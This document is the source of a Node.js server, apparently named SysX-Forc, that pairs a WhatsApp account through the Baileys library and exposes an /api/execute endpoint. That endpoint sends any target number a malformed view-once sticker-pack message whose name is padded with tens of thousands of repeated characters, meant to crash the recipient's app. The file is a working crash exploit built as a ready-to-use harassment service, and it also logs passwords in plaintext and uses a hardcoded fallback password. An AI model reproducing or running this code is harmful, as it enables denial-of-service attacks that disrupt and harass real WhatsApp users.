const express = require('express');
const cors = require('cors');
const dotenv = require('dotenv');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const path = require('path');

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

let sock = null;
let isConnected = false;
let pairCode = '';
let pairingComplete = false;

// ==================== FUNGSI CRASH ====================
async function crashpack(sock, jid) {
    try {
        const proto = require('@whiskeysockets/baileys').proto;
        const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

        const messageContent = generateWAMessageFromContent(
            jid,
            proto.Message.fromObject({
                viewOnceMessage: {
                    message: {
                        stickerPackMessage: {
                            stickerPackId: "1e66102f-2c7c-4bb9-80cf-811e922bd1a8",
                            name: "akira crasher" + "ꦴꦿ".repeat(49000) + "°°".repeat(500),
                            publisher: "",
                            stickers: [
                                { fileName: "aZx-55hzR-QpFJE0CLazii3xvH1jwAE5owBJ9Q+1weg=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "dF9xmRe414rAWSrBRaYer7wahovMEwlPRVJFzVDUGIw=.webp", isAnimated: false, emojis: [""] }
                            ],
                            fileLength: "8020935",
                            fileSha256: "77oJbl0eWZ4bi8z0RZxLsZJ1tu+f/ZErcYE8Sj2K1+U=",
                            fileEncSha256: "2KwixOJtpl4ivq8HMgTQGICW+HMxLnZuQmUN6KPD4kg=",
                            mediaKey: "i4I6325nsuHeYhj4KuyeZ+8bHAxE6A5Rt5uzyNRIaTk=",
                            directPath: "/v/t62.15575-24/23212937_564001070100700_5740166209540264226_n.enc?ccb=11-4&oh=01_Q5Aa1wFfJ2yPLT287gHgeKwk1Ifh1jowuwT0trU3-hyqosIQoQ&oe=686EC6A7&_nc_sid=5e03e0",
                            contextInfo: {},
                            packDescription: "",
                            mediaKeyTimestamp: "1749506440",
                            trayIconFileName: "1e66102f-2c7c-4bb9-80cf-811e922bd1a8.png",
                            thumbnailDirectPath: "/v/t62.15575-24/11293192_987589920117341_7624412198674010830_n.enc?ccb=11-4&oh=01_Q5Aa1wEsjICRK3G8YjlWAC0VhEhMrjAbUBenZphNNmjDSSXM7w&oe=686ED116&_nc_sid=5e03e0",
                            thumbnailSha256: "UOcoPZ0vEtKCLWiY4LjSjJXqBd93qjCI9cUXo70CCtY=",
                            thumbnailEncSha256: "A+BTqfSW5Cnt+tUwAHHcGPuppnk49pB72O3iz9jPeWg=",
                            thumbnailHeight: 252,
                            thumbnailWidth: 252,
                            imageDataHash: "ZGNiZTY2OWU1NDI1YzBjMmE0Y2ExODQ1Nzc5OWM3MGJlNDZmMzgzYTlhNDg1YzdhNDdjNTBlODI0YTc1YTVjZQ==",
                            stickerPackSize: "15000000000",
                            stickerPackOrigin: "USER_CREATED"
                        }
                    }
                }
            }),
            { userJid: jid }
        );

        await sock.relayMessage(jid, messageContent.message, { messageId: messageContent.key.id });
        return { success: true };
    } catch (error) {
        console.error('🔥 CRASH ERROR:', error.message);
        return { success: false, error: error.message };
    }
}

// ==================== CONNECT WA ====================
async function connectWA() {
    try {
        console.log('🔄 Connecting to WhatsApp...');

        // Hapus auth_info kalo ada error
        if (fs.existsSync('auth_info')) {
            try {
                const credsPath = path.join('auth_info', 'creds.json');
                if (fs.existsSync(credsPath)) {
                    const creds = JSON.parse(fs.readFileSync(credsPath, 'utf8'));
                    if (!creds.me || !creds.me.id) {
                        console.log('⚠️ Auth corrupt, deleting...');
                        fs.rmSync('auth_info', { recursive: true, force: true });
                    }
                }
            } catch (e) {
                console.log('⚠️ Auth error, deleting...');
                fs.rmSync('auth_info', { recursive: true, force: true });
            }
        }

        const { state, saveCreds } = await useMultiFileAuthState('auth_info');

        sock = makeWASocket({
            version: [2, 3000, 1015901307],
            auth: state,
            printQRInTerminal: false,
            logger: pino({ level: 'silent' }),
            browser: ['SysX-Forc', 'Chrome', '120.0.0.0'],
            syncFullHistory: false,
            markOnlineOnConnect: false,
            connectTimeoutMs: 60000,
            defaultQueryTimeoutMs: 60000,
            keepAliveIntervalMs: 10000
        });

        sock.ev.on('creds.update', saveCreds);

        sock.ev.on('connection.update', (update) => {
            const { connection, lastDisconnect } = update;

            if (connection === 'open') {
                isConnected = true;
                pairingComplete = true;
                console.log('✅ CONNECTED TO WHATSAPP!');
                console.log('📱 PAIRING COMPLETE!');
            }

            if (connection === 'close') {
                isConnected = false;
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                if (statusCode === DisconnectReason.loggedOut) {
                    console.log('🚫 LOGGED OUT, hapus auth_info');
                    if (fs.existsSync('auth_info')) {
                        fs.rmSync('auth_info', { recursive: true, force: true });
                    }
                } else {
                    console.log('🔁 RECONNECTING...');
                    setTimeout(connectWA, 5000);
                }
            }
        });

        sock.ev.on('pairing-code', (code) => {
            pairCode = code;
            console.log(`📱 PAIR CODE: ${code}`);
        });

        return sock;
    } catch (error) {
        console.error('🔥 CONNECT ERROR:', error.message);
        setTimeout(connectWA, 5000);
        return null;
    }
}

// ==================== API ENDPOINTS ====================

// LOGIN - PASTIKAN PASSWORD SAMA!
app.post('/api/login', (req, res) => {
    const { password } = req.body;
    const expected = process.env.PASSWORD || 'force$$$';
    
    console.log(`🔐 Login attempt: ${password} vs ${expected}`);
    
    if (password === expected) {
        res.json({ success: true, message: 'Login berhasil, BANGSAT!' });
    } else {
        res.status(401).json({ success: false, message: 'Password salah, KONTOL!' });
    }
});

// STATUS
app.get('/api/status', (req, res) => {
    res.json({
        connected: isConnected,
        pairCode: pairCode || null,
        pairingComplete: pairingComplete
    });
});

// PAIR CODE - GENERATE PAIRING CODE
app.post('/api/pair', async (req, res) => {
    try {
        const { number } = req.body;
        if (!number) {
            return res.status(400).json({ success: false, error: 'Nomor HP wajib diisi, ANJING!' });
        }

        console.log(`📱 Request pair for: ${number}`);

        if (!sock) {
            await connectWA();
        }

        let attempts = 0;
        while (!sock && attempts < 10) {
            await new Promise(r => setTimeout(r, 1000));
            attempts++;
        }

        if (!sock) {
            return res.status(500).json({ success: false, error: 'Gagal inisialisasi socket' });
        }

        const code = await sock.requestPairingCode(number);
        pairCode = code;
        console.log(`✅ Pair code generated: ${code}`);
        res.json({ success: true, pairCode: code });
    } catch (error) {
        console.error('🔥 PAIR ERROR:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// EXECUTE CRASH
app.post('/api/execute', async (req, res) => {
    try {
        const { target } = req.body;
        if (!target) {
            return res.status(400).json({ success: false, error: 'Target nomor WA wajib diisi, BANGSAT!' });
        }

        if (!sock || !isConnected) {
            return res.status(500).json({ success: false, error: 'WA belum connect, coba pair dulu!' });
        }

        const jid = target.includes('@') ? target : `${target}@s.whatsapp.net`;
        const result = await crashpack(sock, jid);

        if (result.success) {
            res.json({ success: true, message: `✅ CRASH BERHASIL ke ${target}!` });
        } else {
            res.status(500).json({ success: false, error: result.error });
        }
    } catch (error) {
        console.error('🔥 EXECUTE ERROR:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// LOGOUT
app.post('/api/logout', async (req, res) => {
    try {
        if (sock) {
            await sock.logout();
        }
        isConnected = false;
        sock = null;
        pairCode = '';
        pairingComplete = false;
        if (fs.existsSync('auth_info')) {
            fs.rmSync('auth_info', { recursive: true, force: true });
        }
        res.json({ success: true, message: 'Logout berhasil, GOBLOK!' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ==================== START ====================
console.log('🔥 SYSX-FORC STARTING...');
connectWA();

app.listen(PORT, () => {
    console.log(`🔥 SYSX-FORC RUNNING DI PORT ${PORT}`);
    console.log(`👿 URL: https://brogia-production.up.railway.app`);
});
